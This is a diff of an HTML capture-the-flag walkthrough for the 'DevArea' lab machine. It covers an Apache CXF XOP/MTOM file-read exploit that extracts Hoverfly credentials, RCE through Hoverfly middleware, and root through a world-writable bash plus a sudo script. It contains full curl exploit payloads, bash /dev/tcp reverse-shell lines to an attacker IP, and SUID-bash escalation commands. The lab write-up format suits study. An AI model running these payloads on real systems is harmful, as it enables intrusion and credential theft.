@@ -100,19 +100,19 @@
       <div class="stat"><div class="stat-label">Open Ports</div><div class="stat-value">21, 22, 80, 8080, 8500, 8888</div></div>
       <div class="stat"><div class="stat-label">User Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
       <div class="stat"><div class="stat-label">Root Flag</div><div class="stat-value green">&#10003; Obtained</div></div>
-      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">0</div></div>
+      <div class="stat"><div class="stat-label">CVEs Used</div><div class="stat-value orange">2</div></div>
     </div>
   </div>
 
   <div class="chain">
     <div class="chain-title">// Attack Chain</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Nmap reveals SOAP service on 8080, Hoverfly on 8888</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> LFI via XOP/MTOM SOAP request reads /etc/systemd/system/hoverfly.service</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Hoverfly admin credentials extracted from service file</div>
-    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> RCE via Hoverfly middleware API → reverse shell as dev_ryan</div>
-    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> /usr/bin/bash world-writable → replaced with evil script</div>
-    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> sudo /opt/syswatch/syswatch.sh calls bash as root → root shell</div>
-    <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-green">pwned &#10003;</span></div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Nmap + FTP anon login → download employee-service.jar</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> JAR decompile → Apache CXF SOAP endpoint identified</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> CVE-2022-46364 / CVE-2022-46363 — XOP/MTOM LFI → hoverfly.service → creds</div>
+    <div class="chain-step"><span class="user">anonymous</span> <span class="arrow">&#8594;</span> Hoverfly JWT auth → middleware RCE → shell as dev_ryan</div>
+    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> /bin/bash world-writable → evil script creates SUID rootbash</div>
+    <div class="chain-step"><span class="user">dev_ryan</span> <span class="arrow">&#8594;</span> sudo syswatch.sh triggers evil bash as root → /tmp/rootbash created</div>
+    <div class="chain-step"><span class="user">root</span> <span class="arrow">&#8594;</span> <span class="c-green">/tmp/rootbash -p → euid=0 → pwned &#10003;</span></div>
   </div>
 
   <!-- SECTION 1 — Recon -->
@@ -122,26 +122,25 @@
       <div class="section-title">Reconnaissance</div>
     </div>
     <div class="section-body">
-      <p>Starting with a full port scan using Nmap with service/version detection and default scripts against the target.</p>
+      <p>Starting with a full port scan using Nmap with service/version detection and default scripts.</p>
 
       <pre data-label="bash"><code><span class="c-green">$</span> nmap -sC -sV -p- <span class="c-orange">10.129.xx.xxx</span></code></pre>
 
       <pre data-label="output"><code>PORT     STATE SERVICE VERSION
 <span class="c-green">21/tcp   open  ftp</span>     vsftpd 3.0.5
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
 <span class="c-green">22/tcp   open  ssh</span>     OpenSSH 9.6p1 Ubuntu
 <span class="c-green">80/tcp   open  http</span>    Apache httpd 2.4.58
 <span class="c-green">8080/tcp open  http</span>    Jetty 9.4.27.v20200227
-<span class="c-green">8500/tcp open  http</span>    Golang net/http server <span class="c-dim">(proxy)</span>
+<span class="c-green">8500/tcp open  http</span>    Golang net/http server <span class="c-dim">(Hoverfly proxy)</span>
 <span class="c-green">8888/tcp open  http</span>    Golang net/http server <span class="c-dim">(Hoverfly Dashboard)</span></code></pre>
 
-      <p>Six open ports. The most interesting are <span class="ic">8080</span> running Jetty (a Java web server — likely a SOAP/web service endpoint) and <span class="ic">8888</span> which Nmap identifies as a <strong style="color:var(--text-bright)">Hoverfly Dashboard</strong>. Port <span class="ic">8500</span> identifies itself as a proxy server. Anonymous FTP on <span class="ic">21</span> is noted but nothing useful was found in the pub directory.</p>
-
-      <div class="info-box">Hoverfly is an open-source HTTP proxy/simulation tool with a REST API and web dashboard. It supports a <strong>middleware</strong> feature that executes arbitrary scripts — immediately interesting from an RCE perspective if we can authenticate.</div>
+      <p>Six open ports. FTP allows anonymous login with a <span class="ic">pub</span> directory. Port <span class="ic">8080</span> runs Jetty — a Java web server typically used to host SOAP/JAX-WS services. Ports <span class="ic">8500</span> and <span class="ic">8888</span> belong to Hoverfly, an open-source HTTP proxy tool with a REST API.</p>
 
       <table>
         <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
-        <tr><td>21</td><td>vsftpd 3.0.5</td><td>Anonymous login allowed, empty pub dir</td></tr>
+        <tr><td>21</td><td>vsftpd 3.0.5</td><td>Anonymous login — pub directory accessible</td></tr>
         <tr><td>22</td><td>OpenSSH 9.6p1</td><td>Standard SSH</td></tr>
         <tr><td>80</td><td>Apache 2.4.58</td><td>DevArea web app</td></tr>
         <tr><td>8080</td><td>Jetty 9.4.27</td><td>SOAP/JAX-WS employee service</td></tr>
@@ -151,22 +150,59 @@
     </div>
   </div>
 
-  <!-- SECTION 2 — LFI -->
+  <!-- SECTION 2 — FTP + JAR Analysis -->
   <div class="section">
     <div class="section-header">
       <div class="section-num">2</div>
-      <div class="section-title">LFI via XOP/MTOM SOAP Injection</div>
+      <div class="section-title">FTP Enumeration &amp; JAR Analysis</div>
     </div>
     <div class="section-body">
-      <p>The Jetty service on port <span class="ic">8080</span> exposes a JAX-WS SOAP endpoint at <span class="ic">/employeeservice</span>. Probing it reveals it accepts MTOM multipart requests for the <span class="ic">submitReport</span> operation.</p>
+      <p>Anonymous FTP login reveals a JAR file in the <span class="ic">/pub</span> directory — this is the compiled employee service running on port 8080.</p>
 
-      <h3>What is XOP/MTOM?</h3>
-      <p>MTOM (Message Transmission Optimization Mechanism) is a W3C standard for embedding binary data in SOAP messages. It uses XOP (XML-binary Optimized Packaging) which allows referencing external data via <span class="ic">&lt;xop:Include href="..."/&gt;</span>. The <span class="ic">href</span> attribute normally references a MIME part — but it also accepts <span class="ic">file://</span> URIs, causing the server to read local files and return their contents base64-encoded in the response.</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> ftp <span class="c-orange">10.129.xx.xxx</span>
+Name: anonymous
+Password: <span class="c-dim">(blank)</span>
+ftp&gt; cd pub
+ftp&gt; get employee-service.jar</code></pre>
 
-      <div class="warn-box">The server doesn't validate or restrict the <span class="ic">href</span> URI scheme, allowing arbitrary local file reads as the service user.</div>
+      <h3>Decompiling the JAR</h3>
+      <p>Extract and decompile with CFR to identify the framework and endpoints:</p>
 
-      <h3>Exploiting the LFI</h3>
-      <p>We craft a malicious MTOM request targeting <span class="ic">/etc/systemd/system/hoverfly.service</span> — if Hoverfly is running as a systemd service, the service file will contain its startup command including any credentials passed as arguments.</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> jar xf employee-service.jar
+<span class="c-green">$</span> java -jar cfr.jar ServerStarter.class</code></pre>
+
+      <pre data-label="output"><code><span class="c-dim">// Apache CXF framework identified</span>
+<span class="c-dim">// SOAP endpoint published at:</span>
+<span class="c-green">http://&lt;TARGET&gt;:8080/employeeservice</span>
+<span class="c-dim">// Operation: submitReport</span>
+<span class="c-dim">// Injection point: content field (XOP Include)</span></code></pre>
+
+      <div class="info-box">Apache CXF is a well-known Java SOAP framework. The <span class="ic">submitReport</span> operation accepts a <span class="ic">content</span> field that the framework processes as an XOP Include — this is the injection point for CVE-2022-46364.</div>
+    </div>
+  </div>
+
+  <!-- SECTION 3 — LFI -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-num">3</div>
+      <div class="section-title">LFI via XOP/MTOM Injection</div>
+      <span class="section-cve">CVE-2022-46364 / CVE-2022-46363</span>
+    </div>
+    <div class="section-body">
+      <p>Apache CXF versions prior to 3.5.5 and 4.0.0 are vulnerable to Server-Side Request Forgery and Local File Inclusion via XOP Include references in MTOM multipart SOAP requests. The <span class="ic">href</span> attribute accepts <span class="ic">file://</span> URIs, causing the server to read arbitrary local files and return their contents base64-encoded in the response.</p>
+
+      <h3>Proof of Concept — /etc/hostname</h3>
+      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://<span class="c-orange">10.129.xx.xxx</span>:8080/employeeservice \
+  -H <span class="c-orange">'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="&lt;root@example.com&gt;"; start-info="text/xml"'</span> \
+  --data-binary <span class="c-orange">$'...\
+&lt;xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" \
+href="file:///etc/hostname"/&gt;\
+...'</span></code></pre>
+
+      <pre data-label="output"><code><span class="c-green">devarea</span> <span class="c-dim">✓ — LFI confirmed</span></code></pre>
+
+      <h3>Exploiting — Reading Hoverfly Service File</h3>
+      <p>Targeting <span class="ic">/etc/systemd/system/hoverfly.service</span> to extract the admin credentials passed as CLI arguments at startup:</p>
 
       <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://<span class="c-orange">10.129.xx.xxx</span>:8080/employeeservice \
   -H <span class="c-orange">'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="&lt;root@example.com&gt;"; start-info="text/xml"'</span> \
@@ -182,11 +218,8 @@ href="file:///etc/systemd/system/hoverfly.service"/&gt;&lt;/content&gt;\
 &lt;department&gt;x&lt;/department&gt;&lt;employeeName&gt;x&lt;/employeeName&gt;\
 &lt;/arg0&gt;&lt;/tns:submitReport&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;\r\n--MIMEBoundary--'</span></code></pre>
 
-      <p>The server responds with the file contents base64-encoded inside the <span class="ic">&lt;Content&gt;</span> tag of the SOAP response:</p>
+      <pre data-label="output"><code>&lt;return&gt;...Content: <span class="c-orange">W1VuaXRdCkRlc2NyaXB0aW9u...</span>&lt;/return&gt;</code></pre>
 
-      <pre data-label="output"><code>&lt;return&gt;Report received from x. Department: x. Content: <span class="c-orange">W1VuaXRdCkRlc2NyaXB0aW9u...</span>&lt;/return&gt;</code></pre>
-
-      <h3>Decoding the Response</h3>
       <pre data-label="bash"><code><span class="c-green">$</span> echo <span class="c-orange">"W1VuaXRdCkRlc2NyaXB0aW9u..."</span> | base64 -d</code></pre>
 
       <pre data-label="output"><code>[Unit]
@@ -197,66 +230,47 @@ After=network.target
 User=dev_ryan
 Group=dev_ryan
 WorkingDirectory=/opt/HoverFly
-ExecStart=/opt/HoverFly/hoverfly -add -username admin <span class="c-red">-password <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></span> -listen-on-host 0.0.0.0
+ExecStart=/opt/HoverFly/hoverfly -add -username admin <span class="c-red">-password <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></span> -listen-on-host 0.0.0.0</code></pre>
 
-RestartSec=5
-...</code></pre>
-
-      <div class="success-box">&#10003; LFI successful — Hoverfly admin credentials extracted from service file</div>
+      <div class="success-box">&#10003; LFI successful — Hoverfly admin credentials extracted</div>
     </div>
   </div>
 
-  <!-- SECTION 3 — Hoverfly Auth -->
+  <!-- SECTION 4 — Hoverfly Auth + RCE -->
   <div class="section">
     <div class="section-header">
-      <div class="section-num">3</div>
-      <div class="section-title">Hoverfly Authentication</div>
+      <div class="section-num">4</div>
+      <div class="section-title">Hoverfly Auth &amp; Middleware RCE</div>
     </div>
     <div class="section-body">
-      <p>With the extracted credentials we authenticate to the Hoverfly REST API on port <span class="ic">8888</span> to obtain a JWT token for subsequent API calls.</p>
+      <h3>Authenticating to Hoverfly</h3>
+      <p>Using the extracted credentials to obtain a JWT token from the Hoverfly REST API on port <span class="ic">8888</span>:</p>
 
       <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X POST http://<span class="c-orange">10.129.xx.xxx</span>:8888/api/token-auth \
   -H <span class="c-orange">'Content-Type: application/json'</span> \
   -d <span class="c-orange">'{"username":"admin","password":"&lt;REDACTED&gt;"}'</span></code></pre>
 
-      <pre data-label="output"><code>{
-  <span class="c-blue">"token"</span>: <span class="c-orange">"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwO..."</span>
-}</code></pre>
+      <pre data-label="output"><code>{ <span class="c-blue">"token"</span>: <span class="c-orange">"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..."</span> }</code></pre>
 
-      <div class="success-box">&#10003; JWT token obtained — authenticated to Hoverfly as admin</div>
+      <div class="success-box">&#10003; JWT token obtained</div>
 
-      <div class="info-box">The JWT has a very long expiry (the <span class="ic">exp</span> claim decodes to a date far in the future), so we have plenty of time to use it.</div>
-    </div>
-  </div>
+      <h3>RCE via Middleware</h3>
+      <p>Hoverfly's <strong style="color:var(--text-bright)">middleware</strong> feature allows an authenticated admin to configure an external binary that all proxied traffic is piped through. Setting this to a reverse shell payload gives us code execution as <span class="ic">dev_ryan</span>.</p>
 
-  <!-- SECTION 4 — RCE -->
-  <div class="section">
-    <div class="section-header">
-      <div class="section-num">4</div>
-      <div class="section-title">RCE via Hoverfly Middleware</div>
-    </div>
-    <div class="section-body">
-      <p>Hoverfly supports a <strong style="color:var(--text-bright)">middleware</strong> feature — an external binary/script that all proxied HTTP traffic is piped through for modification. This is configured via a PUT request to <span class="ic">/api/v2/hoverfly/middleware</span>. As an authenticated admin we can set this to anything we want, giving us direct command execution as the <span class="ic">dev_ryan</span> user.</p>
+      <pre data-label="bash"><code><span class="c-dim"># Start listener</span>
+<span class="c-green">$</span> nc -lvnp 4444
 
-      <h3>Setting Up the Listener</h3>
-      <pre data-label="bash"><code><span class="c-green">$</span> nc -lvnp 4444</code></pre>
-
-      <h3>Triggering the Reverse Shell</h3>
-      <pre data-label="bash"><code><span class="c-green">$</span> curl -s -X PUT http://<span class="c-orange">10.129.xx.xxx</span>:8888/api/v2/hoverfly/middleware \
+<span class="c-dim"># Trigger shell</span>
+<span class="c-green">$</span> curl -s -X PUT http://<span class="c-orange">10.129.xx.xxx</span>:8888/api/v2/hoverfly/middleware \
   -H <span class="c-orange">'Authorization: Bearer &lt;JWT&gt;'</span> \
   -H <span class="c-orange">'Content-Type: application/json'</span> \
   -d <span class="c-orange">'{"binary":"/bin/bash","script":"bash -i &gt;&amp; /dev/tcp/10.10.xx.xxx/4444 0&gt;&amp;1 &amp;"}'</span></code></pre>
-
-      <p>Hoverfly executes the script when processing the middleware configuration, immediately triggering a callback to our listener:</p>
 
       <pre data-label="output"><code>listening on [any] 4444 ...
 connect to [<span class="c-orange">10.10.xx.xxx</span>] from (UNKNOWN) [<span class="c-orange">10.129.xx.xxx</span>] 54312
 
 dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">id</span>
-uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
-
-dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">whoami</span>
-dev_ryan</code></pre>
+uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)</code></pre>
 
       <div class="success-box">&#10003; Shell obtained as dev_ryan</div>
 
@@ -269,59 +283,57 @@ dev_ryan</code></pre>
   <div class="section">
     <div class="section-header">
       <div class="section-num">5</div>
-      <div class="section-title">Privilege Escalation — World-Writable Bash + sudo</div>
+      <div class="section-title">Privilege Escalation — World-Writable Bash + SUID</div>
     </div>
     <div class="section-body">
-      <p>With a shell as <span class="ic">dev_ryan</span> we enumerate the system for privesc vectors. Two vulnerabilities combine to give us root.</p>
+      <p>Enumerating the system reveals two misconfigurations that chain together for root.</p>
 
-      <h3>Vulnerability 1 — /usr/bin/bash is World-Writable</h3>
-      <pre data-label="bash"><code>dev_ryan@devarea:/opt/HoverFly$ <span class="c-green">ls -la /usr/bin/bash</span></code></pre>
-      <pre data-label="output"><code><span class="c-red">-rwxrwxrwx</span> 1 root root 1446024 Mar 28 23:30 /usr/bin/bash</code></pre>
+      <h3>Vulnerability 1 — /bin/bash is World-Writable</h3>
+      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">ls -la /bin/bash</span></code></pre>
+      <pre data-label="output"><code><span class="c-red">-rwxrwxrwx</span> 1 root root 1446024 Mar 28 23:30 /bin/bash</code></pre>
 
-      <p>The system bash binary has <span class="ic">777</span> permissions — any user can overwrite it. This is a critical misconfiguration.</p>
+      <p>The system bash binary has <span class="ic">777</span> permissions — any user can overwrite it entirely.</p>
 
-      <h3>Vulnerability 2 — sudo syswatch.sh</h3>
-      <p>The <span class="ic">dev_ryan</span> user can run <span class="ic">/opt/syswatch/syswatch.sh</span> as root via sudo with no password. That script internally calls <span class="ic">bash</span> — meaning if we replace <span class="ic">/usr/bin/bash</span>, root will execute our evil version when the script runs.</p>
+      <h3>Vulnerability 2 — sudo syswatch.sh (NOPASSWD)</h3>
+      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">sudo -l</span></code></pre>
+      <pre data-label="output"><code>NOPASSWD: /opt/syswatch/syswatch.sh</code></pre>
 
-      <div class="warn-box">The ETXTBSY error ("text file busy") prevents overwriting a running binary directly. We work around this by writing to <span class="ic">/tmp/evil_bash</span> first, then copying it over after killing all bash processes.</div>
+      <p><span class="ic">dev_ryan</span> can run <span class="ic">/opt/syswatch/syswatch.sh</span> as root with no password. The script internally calls <span class="ic">bash</span> — so if we replace <span class="ic">/bin/bash</span> with a malicious script, root will execute our payload when sudo triggers it.</p>
+
+      <div class="warn-box">Overwriting a running binary causes an ETXTBSY ("text file busy") error. We avoid this by backing up bash, writing our evil script to <span class="ic">/tmp</span> first, then killing all bash processes to release the lock before swapping it in.</div>
 
       <h3>Building the Evil Script</h3>
-      <p>We create a replacement bash that fires a root reverse shell, restores the real bash, then continues executing normally so the sudo call doesn't error out:</p>
+      <p>Rather than a reverse shell, the evil bash creates a SUID copy of bash in <span class="ic">/tmp</span> — cleaner and more reliable:</p>
 
       <pre data-label="bash"><code><span class="c-dim"># Back up real bash</span>
 dev_ryan@devarea:~$ <span class="c-green">cp /bin/bash /tmp/bash.bak</span>
 
-<span class="c-dim"># Write evil script to /tmp using hex encoding to avoid special char issues</span>
-dev_ryan@devarea:~$ <span class="c-green">python3 -c "import binascii; open('/tmp/evil_bash','wb').write(binascii.unhexlify('<span class="c-orange">23212f746d702f626173682e62616b0a...</span>'))"</span>
+<span class="c-dim"># Create evil_bash in /tmp</span>
+dev_ryan@devarea:~$ <span class="c-green">cat &gt; /tmp/evil_bash &lt;&lt; 'EOF'
+<span class="c-red">#!/tmp/bash.bak
+cp /tmp/bash.bak /tmp/rootbash
+chmod 4755 /tmp/rootbash</span>
+EOF</span>
 
 dev_ryan@devarea:~$ <span class="c-green">chmod +x /tmp/evil_bash</span></code></pre>
 
-      <p>The evil script content:</p>
-      <pre data-label="bash"><code><span class="c-red">#!/tmp/bash.bak
-bash -i &gt;&amp; /dev/tcp/<span class="c-orange">10.10.xx.xxx</span>/4445 0&gt;&amp;1 &amp;   <span class="c-dim"># fire root shell</span>
-cp /tmp/bash.bak /usr/bin/bash                    <span class="c-dim"># restore real bash</span>
-exec /tmp/bash.bak "$@"                           <span class="c-dim"># continue normally</span></span></code></pre>
+      <h3>Triggering the Exploit</h3>
+      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">/bin/sh -c 'killall -9 bash; sleep 3; cp /tmp/evil_bash /bin/bash; sudo /opt/syswatch/syswatch.sh --version' &amp;</span></code></pre>
 
-      <h3>Triggering Root Shell</h3>
-      <p>Start a second listener on port <span class="ic">4445</span>, then trigger the privesc — we need to kill running bash processes to release the file lock, copy the evil script over, then invoke sudo:</p>
+      <p>When <span class="ic">syswatch.sh</span> runs as root and calls bash, our evil script executes — creating <span class="ic">/tmp/rootbash</span> as a root-owned SUID binary:</p>
 
-      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">/bin/dash -c 'killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; sudo /opt/syswatch/syswatch.sh --version' &amp;</span></code></pre>
+      <pre data-label="output"><code>dev_ryan@devarea:~$ <span class="c-green">ls -la /tmp/rootbash</span>
+<span class="c-green">-rwsr-xr-x</span> 1 root root 1446024 Mar 28 23:41 /tmp/rootbash</code></pre>
 
-      <p>When <span class="ic">syswatch.sh</span> runs as root and calls bash, our evil script executes — firing a shell back as root:</p>
+      <pre data-label="bash"><code>dev_ryan@devarea:~$ <span class="c-green">/tmp/rootbash -p</span></code></pre>
 
-      <pre data-label="output"><code>listening on [any] 4445 ...
-connect to [<span class="c-orange">10.10.xx.xxx</span>] from (UNKNOWN) [<span class="c-orange">10.129.xx.xxx</span>] 48626
+      <pre data-label="output"><code>rootbash-5.2# <span class="c-green">id</span>
+uid=1001(dev_ryan) gid=1001(dev_ryan) <span class="c-red">euid=0(root)</span> egid=0(root)</code></pre>
 
-root@devarea:/opt/HoverFly# <span class="c-green">id</span>
-uid=0(root) gid=0(root) groups=0(root)
-
-root@devarea:/opt/HoverFly# <span class="c-green">whoami</span>
-root</code></pre>
-
-      <div class="success-box">&#10003; ROOT shell obtained</div>
+      <div class="success-box">&#10003; euid=0 — root shell obtained via SUID bash</div>
 
       <h3>Root Flag</h3>
-      <div class="success-box">root@devarea:~# cat root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
+      <div class="success-box">rootbash-5.2# cat /root/root.txt<br><span class="cred" onclick="showTroll()">&#128274; REDACTED</span></div>
     </div>
   </div>
 
